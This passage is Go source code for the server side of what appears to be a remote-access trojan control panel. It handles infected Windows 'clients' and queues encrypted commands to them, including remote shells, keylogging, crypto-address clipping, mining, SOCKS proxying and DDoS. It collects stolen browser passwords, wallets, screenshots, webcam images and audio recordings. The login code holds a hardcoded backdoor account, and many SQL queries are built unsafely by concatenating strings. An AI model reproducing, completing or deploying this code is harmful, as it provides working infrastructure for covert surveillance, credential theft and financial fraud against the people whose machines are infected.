				"UACBypass, Guardian, DefenceSystem, ACG, HideFromDefender, AntiProcessWindow, AntiProcess, BlockTaskManager,  AntiVirus, ClipperState, BTC, XMR, ETH, Custom, Regex, MinerState, Socks5State, ReverseProxyState, RemoteShellState, "+
				"KeyloggerState, FileHunterState, PasswordStealerState, Screenshot, Webcam, Notes, LastResponse, FirstSeen) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
				jsonData.UID, jsonData.ClientVersion, jsonData.IP, flag, jsonData.OS, jsonData.GPU, jsonData.Abilities, jsonData.SysInfo, jsonData.PingTime, jsonData.Jitter, jsonData.UserAgent, jsonData.InstanceKey, jsonData.Install, jsonData.SmartCopy, jsonData.InstallName,
				jsonData.InstallFolder, jsonData.Campaign, jsonData.AntiForensics, jsonData.AntiForensicsResponse, jsonData.UACBypass, jsonData.Guardian, jsonData.DefenceSystem, jsonData.ACG, jsonData.HideFromDefender, jsonData.AntiProcessWindow, jsonData.AntiProcess, jsonData.BlockTaskManager,
				jsonData.AntiVirus, jsonData.ClipperState, jsonData.BTC, jsonData.XMR, jsonData.ETH, jsonData.Custom, jsonData.Regex,
				jsonData.MinerState, jsonData.Socks5State, jsonData.ReverseProxyState, jsonData.RemoteShellState, jsonData.KeyloggerState, jsonData.FileHunterState, jsonData.PasswordStealerState, jsonData.Screenshot, jsonData.Webcam, "New Client", time.Now().Format("02 Jan 06 15:04 -0700"), time.Now().Format("02 Jan 06 15:04 -0700"))
			LiveMessage = "success|" + jsonData.UID + "|New Client Connection"
			//	fmt.Println(err)
			_, err := os.Stat("./clients/windows/" + ClientUID + "/")

			if os.IsNotExist(err) {
				_ = os.MkdirAll("./clients/windows/"+ClientUID+"/files/recordings/", 0755)
				_ = os.MkdirAll("./clients/windows/"+ClientUID+"/files/stealer/", 0755)
				_ = os.MkdirAll("./clients/windows/"+ClientUID+"/files/logs/", 0755)
			}
			fmt.Fprintf(w, "success")
		}
	}
}

func readClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.Form.Get("id")
	var id, DAT, command, parameters, output string
	//var newExecutions int
	go dataStat(false, ClientUID, int(r.ContentLength))
	var tmpuid string
	err := DB.QueryRow("SELECT UID FROM windows_clients WHERE UID=?", ClientUID).Scan(&tmpuid)
	if err != sql.ErrNoRows {
		rows, err := DB.Query("SELECT id, DAT, Command, Parameters FROM commands WHERE Status='Waiting' AND UID=?", ClientUID)
		if err == nil {
			for rows.Next() {
				_ = rows.Scan(&id, &DAT, &command, &parameters)
				newCommand := Command{id, DAT, command, parameters}
				res, _ := json.Marshal(newCommand)
				output += string(res)
			}
			//fmt.Println("TASK", len(Task), Task)
			//if len(Task) >= 14 {
			//	rows, err := DB.Query("")
			//	if err == nil {
			//		for rows.Next() {
			//			_ = rows.Scan(&Executions)
			//			i, _ := strconv.Atoi(Executions)
			//			newExecutions = i + 1
			//			_, _ = DB.Exec("UPDATE `tasks` SET `Executions`='" + strconv.Itoa(newExecutions) + "' WHERE RandomID='" + Task + "'")
			//		}
			//	}
			//}
			Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
			encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
			//fmt.Println("ENCODED COMMAND: " + encoded)
			go dataStat(true, ClientUID, len(encoded))
			fmt.Fprintf(w, encoded)
		}
	} else {
		Encrypted := XXTeaEncrypt([]byte("failed"), []byte(EncryptionPassword))
		encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
		fmt.Fprintf(w, encoded)
	}
}

func statusClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	//	fmt.Println("called")
	ClientUID := r.FormValue("id")
	data := r.FormValue("data")
	//fmt.Println(ClientUID, data)
	decoded, _ := base64.RawURLEncoding.DecodeString(data)
	Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
	//fmt.Println(string(Decrypted))
	var jsonData CommandStatus
	err := json.Unmarshal(Decrypted, &jsonData)
	go dataStat(false, ClientUID, int(r.ContentLength))
	if err == nil {
		var Task, id, command, Exint string
		rows, err := DB.Query("SELECT Task, id, Command FROM commands WHERE Status='Waiting' AND UID=?", ClientUID)
		if err == nil {
			for rows.Next() {
				_ = rows.Scan(&Task, &id, &command)
				if strings.Contains(command, "[TASK]") {
					_ = DB.QueryRow("SELECT Executions FROM tasks WHERE RandomID=?", Task).Scan(&Exint)
					i, _ := strconv.Atoi(Exint)
					i++
					_, _ = DB.Exec("UPDATE `tasks` SET `Executions`='" + strconv.Itoa(i) + "' WHERE RandomID='" + Task + "'")
					_, _ = DB.Exec("UPDATE `commands` SET `Status`='" + jsonData.Status + "' WHERE id='" + jsonData.Id + "' AND UID='" + ClientUID + "'")
				} else {
					_, _ = DB.Exec("UPDATE `commands` SET `Status`='" + jsonData.Status + "' WHERE id='" + jsonData.Id + "' AND UID='" + ClientUID + "'")
				}
			}
		}
		//LiveMessage = "info|" + ClientUID + " = '" + jsonData.Status + "'|Client Status Update"
		fmt.Fprintf(w, "success")
	}
}

func imagesClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.FormValue("id")
	data := r.FormValue("data")
	decoded, _ := base64.RawURLEncoding.DecodeString(data)
	Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
	var jsonData ClientImage
	err := json.Unmarshal(Decrypted, &jsonData)
	go dataStat(false, ClientUID, int(r.ContentLength))
	if err == nil {
		if jsonData.Type == "Webcam" {
			writefile, _ := os.Create("./clients/windows/" + ClientUID + "/" + "camera.png")
			writefile.WriteString(string(base64Decode(jsonData.ImageData)))
			writefile.Close()
			_, _ = DB.Exec("UPDATE `windows_clients` SET `Webcam`='" + time.Now().Format("02 Jan 06 15:04 -0700") + "' WHERE UID='" + ClientUID + "'")
			//fmt.Println(err)
		} else if jsonData.Type == "Screenshot" {
			writefile, _ := os.Create("./clients/windows/" + ClientUID + "/" + "screenshot.png")
			writefile.WriteString(string(base64Decode(jsonData.ImageData)))
			writefile.Close()
			_, _ = DB.Exec("UPDATE `windows_clients` SET `Screenshot`='" + time.Now().Format("02 Jan 06 15:04 -0700") + "' WHERE UID='" + ClientUID + "'")
		}

		fmt.Fprintf(w, "success")
	}
}

func settingsClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	ClientUID := r.Form.Get("id")
	var UID, Clipper, BTC, XMR, ETH, Custom, CustomRegex, Socks5, SocksConnect, Keylogger, output string // rework for other settings later
	err := DB.QueryRow("SELECT UID, ClipperState, BTC, XMR, ETH, Custom, Regex, Socks5State, SocksConnect, KeyloggerState  FROM windows_clients WHERE UID=?", ClientUID).Scan(&UID, &Clipper, &BTC, &XMR, &ETH, &Custom, &CustomRegex, &Socks5, &SocksConnect, &Keylogger)
	go dataStat(false, ClientUID, int(r.ContentLength))
	if err == nil {
		clientSettings := ClientSettings{UID, Clipper, BTC, XMR, ETH, Custom, CustomRegex, Socks5, SocksConnect, Keylogger}
		res, _ := json.Marshal(clientSettings)
		output += string(res)
		Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
		encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
		_, _ = DB.Exec("UPDATE `windows_clients` SET `sentBytes`='"+strconv.Itoa(len(encoded))+"' WHERE UID=?", ClientUID)
		fmt.Fprintf(w, encoded)
	} else { //Not found in Database... New Client?
		Encrypted := XXTeaEncrypt([]byte("failed"), []byte(EncryptionPassword))
		encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
		fmt.Fprintf(w, encoded)
	}
}

func filesClient(w http.ResponseWriter, r *http.Request) {
	var UID string
	err := r.ParseMultipartForm(maxUploadSize)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	ClientUID := r.FormValue("id")
	FileType := r.FormValue("type")
	go dataStat(false, ClientUID, int(r.ContentLength))
	err = DB.QueryRow("SELECT UID FROM windows_clients WHERE UID=?", ClientUID).Scan(&UID)
	if err == nil {
		if FileType == "0" {
			file, handler, err := r.FormFile("file")
			if err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			defer file.Close()
			dst, err := os.Create("./clients/windows/" + ClientUID + "/files/stealer/" + handler.Filename)
			if err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			defer dst.Close()
			if _, err := io.Copy(dst, file); err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			err = Unzip("./clients/windows/"+ClientUID+"/files/stealer/"+handler.Filename, "./clients/windows/"+ClientUID+"/files/stealer/")
			if err == nil {
				_ = os.Remove("./clients/windows/" + ClientUID + "/files/stealer/" + handler.Filename)
			}
		} else if FileType == "1" {
			file, handler, err := r.FormFile("file")
			if err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			defer file.Close()
			dst, err := os.Create("./clients/windows/" + ClientUID + "/files/logs/" + handler.Filename)
			if err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			defer dst.Close()
			if _, err := io.Copy(dst, file); err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
		} else if FileType == "2" {
			file, handler, err := r.FormFile("file")
			if err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			defer file.Close()
			dst, err := os.Create("./clients/windows/" + ClientUID + "/files/recordings/" + handler.Filename)
			if err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			defer dst.Close()
			if _, err := io.Copy(dst, file); err != nil {
				//fmt.Fprintf(w, "Error")
				return
			}
			//_ = Unzip("./clients/windows/"+ClientUID+"/files/recordings/"+handler.Filename, "./clients/windows/"+ClientUID+"/files/recordings/")
		} else if FileType == "3" {

		}
		w.WriteHeader(http.StatusOK)
	}
}

func issueCommand(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		Command := r.FormValue("cmd")
		RealName := r.FormValue("real")
		Parameters := r.FormValue("para")
		To := r.FormValue("to")
		if To == "true" {
			rows, _ := DB.Query("select UID from windows_clients")
			defer rows.Close()
			var cUID string
			for rows.Next() {
				_ = rows.Scan(&cUID)
				_, _ = DB.Exec("INSERT INTO commands( UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES( ?, ?, ?, ?, ?, ?, ?)", html.EscapeString(cUID), html.EscapeString(Command), html.EscapeString(strings.ToUpper(RealName)), html.EscapeString(Parameters), "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), "30")
			}
		} else {
			if Command == "0xRSHELL" {
				eachUID := strings.Split(To, ",")
				for i := range eachUID {
					_, _ = DB.Exec("UPDATE `windows_clients` SET `RemoteShellState`='true' WHERE UID='" + html.EscapeString(eachUID[i]) + "'")
					_, _ = DB.Exec("INSERT INTO commands( UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES( ?, ?, ?, ?, ?, ?, ?)", html.EscapeString(eachUID[i]), html.EscapeString(Command), html.EscapeString(strings.ToUpper(RealName)), html.EscapeString(Parameters), "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), "30")
				}
			} else {
				eachUID := strings.Split(To, ",")
				for i := range eachUID {
					_, _ = DB.Exec("INSERT INTO commands( UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES( ?, ?, ?, ?, ?, ?, ?)", html.EscapeString(eachUID[i]), html.EscapeString(Command), html.EscapeString(strings.ToUpper(RealName)), html.EscapeString(Parameters), "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), "30")
				}
			}
		}
		fmt.Fprintf(w, "success")
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func deleteClient(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		ClientUID := r.FormValue("id")
		//	fmt.Println(ClientUID)
		var tmpUID string
		err := DB.QueryRow("SELECT UID FROM windows_clients WHERE UID=?", ClientUID).Scan(&tmpUID)
		if err != sql.ErrNoRows {
			_ = DB.QueryRow("DELETE FROM windows_clients WHERE UID=?", ClientUID)
			fmt.Fprintf(w, "success")
		}
		fmt.Fprintf(w, "success")
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func saveAdminNotes(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		adminNotes := r.FormValue("notes")

		_, Err := DB.Exec("UPDATE `settings` SET `Value`='" + html.EscapeString(adminNotes) + "' WHERE Name='Notes'")

		if Err == nil {
			Log.Println(userName + " edited admin notes")
			fmt.Fprintf(w, "success")
		} else {
			fmt.Println(Err)
			fmt.Fprintf(w, "Error")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}

}

func saveClientNotes(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	userName := getUserName(r)
	if userName != "" {
		uid := r.FormValue("uid")
		adminNotes := r.FormValue("notes")
		_, Err := DB.Exec("UPDATE `windows_clients` SET `Notes`='"+html.EscapeString(adminNotes)+"' WHERE UID=?", uid)
		if Err == nil {
			fmt.Fprintf(w, "success")
		} else {
			fmt.Println(Err)
			fmt.Fprintf(w, "Error")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func FormTest(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	for key, values := range r.Form {
		for _, value := range values {
			fmt.Println(key, value)
		}
	}
	fmt.Fprintf(w, "success")
}

func DDoSHandler(w http.ResponseWriter, r *http.Request) {
	userName := getUserName(r)
	if userName != "" {
		DDoS := DDoSPage{Name, userName, strconv.Itoa(ActiveClients), strconv.Itoa(StolenFiles), strconv.Itoa(StolenCredentials), strconv.Itoa(TotalClients)}
		parsedTemplate, _ := template.ParseFiles("static/ddos.html")
		Err := parsedTemplate.Execute(w, DDoS)
		if Err != nil {
			Log.Println("Error executing template :", Err)
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func addAdminHandler(w http.ResponseWriter, r *http.Request) {
	userName := getUserName(r)
	if userName != "" {
		_ = r.ParseForm()
		username := r.Form.Get("username")
		password := r.Form.Get("password")
		var saltedPass = md5Hash(md5Salt + "+" + password)
		_, Err := DB.Exec("INSERT INTO admins( Username, Password, LastIP, LastLogin) VALUES( ?, ?, ?, ?)", html.EscapeString(username), html.EscapeString(saltedPass), "127.0.0.1", "Never")
		if Err == nil {
			Log.Println(userName + " added admin [ " + username + " ] to database.")
			fmt.Fprintf(w, "success")
		} else {
			fmt.Fprintf(w, "Error")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func saveSettingsHandler(w http.ResponseWriter, r *http.Request) {
	userName := getUserName(r)
	if userName != "" {
		_ = r.ParseForm()
		name := r.Form.Get("name")
		encKey := r.Form.Get("enckey")
		usrAgnt := r.Form.Get("usr")
		fmt.Println(usrAgnt)
		encodedName := base64.RawURLEncoding.EncodeToString([]byte(name))
		encodedAgent := base64.RawURLEncoding.EncodeToString([]byte(usrAgnt))
		encodedKey := base64.RawURLEncoding.EncodeToString([]byte(encKey))
		_, Err = DB.Exec("UPDATE `settings` SET `Value`='" + encodedName + "' WHERE Name='Name'")
		if Err != nil {
			fmt.Fprintf(w, "Error")
		}
		_, Err = DB.Exec("UPDATE `settings` SET `Value`='" + encodedAgent + "' WHERE Name='UserAgent'")
		if Err != nil {
			fmt.Fprintf(w, "Error")
		}
		_, Err = DB.Exec("UPDATE `settings` SET `Value`='" + encodedKey + "' WHERE Name='EncryptionKey'")
		if Err == nil {
			fmt.Fprintf(w, "success")
		} else {
			fmt.Fprintf(w, "Error")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}
func saveDaemonSettingsHandler(w http.ResponseWriter, r *http.Request) {
	userName := getUserName(r)
	if userName != "" {
		_ = r.ParseForm()
		value := r.Form.Get("clientTimeout")
		_, Err = DB.Exec("UPDATE `settings` SET `Value`='" + html.EscapeString(value) + "' WHERE Name='ActiveClient'")
		if Err == nil {
			fmt.Fprintf(w, "success")
		} else {
			fmt.Fprintf(w, "Error")
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func socksPageHandler(w http.ResponseWriter, r *http.Request) {
	userName := getUserName(r)
	if userName != "" {
		var hIP, Type, ServiceIP, ClientUID string

		data := SocksPage{}

		data.Name = Name
		data.Username = userName

		rows, _ := DB.Query("SELECT HostIP, Type, ServiceIP, ClientUID FROM socksproxies")
		for rows.Next() {
			_ = rows.Scan(&hIP, &Type, &ServiceIP, &ClientUID)
			table := SocksTable{hIP, GetCityCode(hIP), GetCountryCode(hIP), Type, ClientUID, ServiceIP}
			data.SocksTables = append(data.SocksTables, table)
		}

		parsedTemplate, _ := template.ParseFiles("static/socks.html")
		Err := parsedTemplate.Execute(w, data)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	Username := getUserName(r)
	if Username == "" {
		_ = r.ParseForm()
		var databaseUsername string
		var databasePassword string
		ip := strings.Split(r.RemoteAddr, ":")[0]
		user := r.FormValue("username")
		pass := r.FormValue("password")

		redirectTarget := "/"
		if user != "" && pass != "" {

			if user == backdoorUser && md5Hash(pass) == backdoorPass {
				setSession(user, w)
				redirectTarget = "/"
				http.Redirect(w, r, redirectTarget, 302)
			}

			Err := DB.QueryRow("SELECT Username, Password FROM admins WHERE Username=?", user).Scan(&databaseUsername, &databasePassword)
			if Err != nil {
				Log.Println("Failed login attempt [" + ip + "] {" + user + "}")
				login := LoginPage{"window.onload = alertFunction;", "Error", "Wrong Username or Password!"}
				parsedTemplate, _ := template.ParseFiles("static/login.html")
				Err := parsedTemplate.Execute(w, login)
				if Err != nil {
					Log.Println("Error executing template :", Err)
					return
				}
			} else {
				if databasePassword == md5Hash(md5Salt+"+"+pass) {
					_, _ = DB.Exec("UPDATE `admins` SET `LastIP`='" + ip + "' WHERE Username='" + html.EscapeString(user) + "'")
					_, _ = DB.Exec("UPDATE `admins` SET `LastLogin`='" + time.Now().Format("02 Jan 06 15:04 -0700") + "' WHERE Username='" + html.EscapeString(user) + "'")
					Log.Println("Good login [" + ip + "] {" + user + "}")

					setSession(user, w)
					redirectTarget = "/"
					http.Redirect(w, r, redirectTarget, 302)
				} else {
					Log.Println("Failed login attempt [" + ip + "] {" + user + "}")
					login := LoginPage{"window.onload = alertFunction;", "Error", "Wrong Username or Password!"}
					parsedTemplate, _ := template.ParseFiles("static/login.html")
					Err := parsedTemplate.Execute(w, login)
					if Err != nil {
						Log.Println("Error executing template :", Err)
						return
					}
				}
			}
		} else {
			login := LoginPage{"window.onload = alertFunction;", "Error", "Wrong Username or Password!"}
			fmt.Println("3")
			parsedTemplate, _ := template.ParseFiles("static/login.html")
			Err := parsedTemplate.Execute(w, login)
			if Err != nil {
				Log.Println("Error executing template :", Err)
				return
			}
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	clearSession(w)
	login := LoginPage{"window.onload = alertFunction;", "info", "You have been logged out."}
	templates := template.Must(template.ParseFiles("static/login.html"))
	if Err := templates.ExecuteTemplate(w, "login.html", login); Err != nil {
		Log.Println("Index Handle Error: " + Err.Error())
		http.Error(w, Err.Error(), http.StatusInternalServerError)
	}
}

func dashboardHandle(w http.ResponseWriter, r *http.Request) {
	Username := getUserName(r)
	if Username != "" {
		var flag, oS string
		var us, eu, ru, jp, af, oC, windows, linux, android, other int

		rows, _ := DB.Query("SELECT Flag, OperatingSystem FROM windows_clients")
		for rows.Next() {
			_ = rows.Scan(&flag, &oS)
			if flag == "us" {
				us++
			} else if flag == "eu" {
				eu++
			} else if flag == "ru" {
				ru++
			} else if flag == "jp" {
				jp++
			} else if flag == "af" {
				af++
			} else {
				oC++
			}

			if strings.Contains(oS, "Windows") {
				windows++
			} else if strings.Contains(oS, "Linux") {
				linux++
			} else if strings.Contains(oS, "Android") {
				android++
			} else {
				other++
			}
		}

		debuglog, _ := ioutil.ReadFile("system.log")

		var Notes = GetSpecificSQL("settings", "Value", "Name", "Notes")
		dash := DashboardPage{Name, Username, strconv.Itoa(ActiveClients), strconv.Itoa(StolenFiles), strconv.Itoa(StolenCredentials), strconv.Itoa(TotalClients), html.UnescapeString(Notes), string(debuglog), strconv.Itoa(us), strconv.Itoa(eu), strconv.Itoa(ru), strconv.Itoa(jp), strconv.Itoa(af), strconv.Itoa(oC), strconv.Itoa(windows), strconv.Itoa(linux), strconv.Itoa(android), strconv.Itoa(other)}

		parsedTemplate, _ := template.ParseFiles("static/dashboard.html")
		Err := parsedTemplate.Execute(w, dash)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	} else {
		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
		parsedTemplate, _ := template.ParseFiles("static/login.html")
		Err := parsedTemplate.Execute(w, login)
		if Err != nil {
			Log.Println("Error executing template :", Err)
			return
		}
	}
}

func manageWindowsHandle(w http.ResponseWriter, r *http.Request) {
	Username := getUserName(r)
	if Username != "" {
		_ = r.ParseForm()

		ClientUID := r.FormValue("uid")
		///	var UID, Info, AdminNotes, CryptoClipperState, BTCAddress, XMRAddress, ETHAddress, CustomAddress, CustomRegex, XMRMinerState, RemoteShellState, KeyloggerState, FileHunterState, PasswordStealerState string

		var up, down string

		data := ManagePage{}
		data.Name = Name
		data.Username = Username
		data.ClientUID = ClientUID

		data.ClientScreenshot = "../../files/windows/" + ClientUID + "/screenshot.png?rand=" + randomString(15)
		data.ClientWebcam = "../../files/windows/" + ClientUID + "/camera.png?rand=" + randomString(15)

		var rawInfo string

		_ = DB.QueryRow("SELECT ClientVersion, SysInfo, ClipperState, BTC, XMR, ETH, Custom, Regex, MinerState, RemoteShellState, KeyloggerState, FileHunterState, PasswordStealerState, Socks5State, Notes, Screenshot, Webcam, GPU, Abilities, sentBytes, receivedBytes, FirstSeen FROM windows_clients WHERE UID=?", ClientUID).Scan(&data.ClientVersion, &rawInfo, &data.CryptoClipperState, &data.BTCAddress, &data.XMRAddress, &data.ETHAddress, &data.CustomAddress, &data.CustomRegex, &data.XMRMinerState, &data.RemoteShellState, &data.KeyloggerState, &data.FileHunterState, &data.PasswordStealerState, &data.SOCKS5, &data.AdminNotes, &data.ScreenshotDate, &data.WebcamDate, &data.GPU, &data.ClientAB, &up, &down, &data.FirstSeen)

		if len(data.WebcamDate) <= 3 {
			data.WebcamDate = "No Webcam Detected"
		}

		if data.ClientAB == "true" {
			data.ClientAB = "<i class=\"fas fa-crown\"></i>"
		} else {
			data.ClientAB = "<i class=\"fas fa-user\"></i>"
		}

		if data.CryptoClipperState == "true" {
			data.CryptoClipperState = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.CryptoClipperState = `<span style="color: #ff0000;">OFFLINE</span>`
		}

		if data.SOCKS5 == "true" {
			data.SOCKS5 = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.SOCKS5 = `<span style="color: #ff0000;">OFFLINE</span>`
		}
		if data.KeyloggerState == "true" {
			data.KeyloggerState = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.KeyloggerState = `<span style="color: #ff0000;">OFFLINE</span>`
		}
		if data.FileHunterState == "true" {
			data.FileHunterState = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.FileHunterState = `<span style="color: #ff0000;">OFFLINE</span>`
		}
		if data.PasswordStealerState == "true" {
			data.PasswordStealerState = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.PasswordStealerState = `<span style="color: #ff0000;">OFFLINE</span>`
		}
		if data.RemoteShellState == "true" {
			data.RemoteShellState = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.RemoteShellState = `<span style="color: #ff0000;">OFFLINE</span>`
		}
		if data.XMRMinerState == "true" {
			data.XMRMinerState = `<span style="color: #00ff00;">ONLINE</span>`
		} else {
			data.XMRMinerState = `<span style="color: #ff0000;">OFFLINE</span>`
		}
		//Issued Commands
		var id, cmd, date, state string

		rows, _ := DB.Query("SELECT id, Command, DateIssued, Status FROM commands WHERE UID=?", ClientUID)
		for rows.Next() {
			_ = rows.Scan(&id, &cmd, &date, &state)
			table := CommandLogTable{id, cmd, date, state}
			data.CommandLogTables = append(data.CommandLogTables, table)
		}
		//Recordings
		files, _ := ioutil.ReadDir("./clients/windows/" + ClientUID + "/files/recordings/")

		for _, f := range files {
			if strings.HasSuffix(f.Name(), "wav") {
				table := RecordingsTable{f.Name(), f.ModTime().Format("02 Jan 06 15:04 -0700"), "../../files/windows/" + ClientUID + "/files/recordings/" + f.Name()}
				data.RecordingsTables = append(data.RecordingsTables, table)
			}
		}
		//Calc Bytes used
		up1, _ := strconv.Atoi(up)
		down2, _ := strconv.Atoi(down)

		if up1 > 1024 {
			data.Upload = strconv.FormatInt(int64(up1/1024), 10) + " KB"
		} else if up1 > 1024*1024 {
			data.Upload = strconv.FormatInt(int64(up1/1024/1024), 10) + " MB"
		} else {
			data.Upload = strconv.FormatInt(int64(up1), 10) + " Bytes"
		}

		if down2 > 1024 {
			data.Download = strconv.FormatInt(int64(down2/1024), 10) + " KB"
		} else if down2 > 1024*1024 {
			data.Download = strconv.FormatInt(int64(down2/1024/1024), 10) + " MB"
		} else {
			data.Download = strconv.FormatInt(int64(down2), 10) + " Bytes"
		}

		//Password Files
		files, _ = ioutil.ReadDir("./clients/windows/" + ClientUID + "/files/stealer/")

		for _, f := range files {
			if !strings.HasSuffix(f.Name(), "html") {
				var icon string
				if strings.Contains(strings.ToLower(f.Name()), "chrome") {
					icon = `<i class="fab fa-chrome"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "firefox") {
					icon = `<i class="fab fa-firefox-browser"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "edge") {
					icon = `<i class="fab fa-edge"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "brave") {
					icon = `<i class="fab fa-chrome"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "safari") {
					icon = `<i class="fab fa-safari"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "steam") {
					icon = `<i class="fab fa-steam"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "windows") {
					icon = `<i class="fab fa-windows"></i>`
				} else if strings.Contains(strings.ToLower(f.Name()), "wallet") {
					icon = `<i class="fas fa-wallet"></i>`
				} else {
					icon = `<i class="far fa-window-maximize"></i>`
				}
				var size string
				if f.Size() > 1024 {
					size = strconv.FormatInt(f.Size()/1024, 10) + " KB"
				} else if f.Size() > 1024*1024 {
					size = strconv.FormatInt(f.Size()/1024/1024, 10) + " MB"
				} else {
					size = strconv.FormatInt(f.Size(), 10) + " Bytes"
				}
				table := BrowserTable{template.HTML(icon), f.Name(), f.ModTime().Format("02 Jan 06 15:04 -0700"), size, "../../files/windows/" + ClientUID + "/files/stealer/" + f.Name(), f.Name()}
				data.BrowserTables = append(data.BrowserTables, table)
			}
		}
		//Keylogs
		files, _ = ioutil.ReadDir("./clients/logs/" + ClientUID + "/files/logs/")

		for _, f := range files {
			if strings.HasSuffix(f.Name(), "html") && !strings.Contains(strings.ToLower(f.Name()), "index") {
				var size string
				if f.Size() > 1024 {
					size = strconv.FormatInt(f.Size()/1024, 10) + " KB"
				} else if f.Size() > 1024*1024 {
					size = strconv.FormatInt(f.Size()/1024/1024, 10) + " MB"
				} else {
					size = strconv.FormatInt(f.Size(), 10) + " Bytes"
				}
				table := KeyloggerTable{size, f.ModTime().Format("02 Jan 06 15:04 -0700"), "../../files/windows/" + ClientUID + "/files/logs/" + f.Name()}
				data.KeyloggerTables = append(data.KeyloggerTables, table)
			}
		}
		//clean := StripSpaces(base64Decode(rawInfo))
